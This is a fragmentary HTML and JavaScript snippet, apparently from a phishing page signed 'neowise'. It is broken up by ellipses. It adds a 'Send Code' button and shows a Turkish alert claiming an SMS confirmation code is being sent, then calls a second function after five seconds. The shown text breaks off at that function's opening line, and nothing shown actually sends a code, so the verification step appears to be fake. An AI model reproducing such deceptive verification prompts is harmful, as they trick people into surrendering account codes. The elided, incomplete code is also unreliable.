...
<html>
 ...
 <body class='body'>
    ...
    <form method="post">
     ...
     <br>
      ...
      <p id='buttonn'></p>
       ...
       <p id='submitt'><button type="submit" onclick="neo()"  style="width: 150px; 
     font-size: 18px;  
     margin: 0 auto;
     background-color: red; 
     border: none; 
  ...
  <script>
    ...
    document.getElementById("buttonn").innerHTML='<input type="submit" value="Send Code" onclick="neo();" class="button">';


    }
    function neo(){
      window.alert("Smsle Onay Kodunuz Gönderiliyor!");//neowise
      setTimeout(neo8, 5000);//neowise
    }
    function neo8(){//neowise
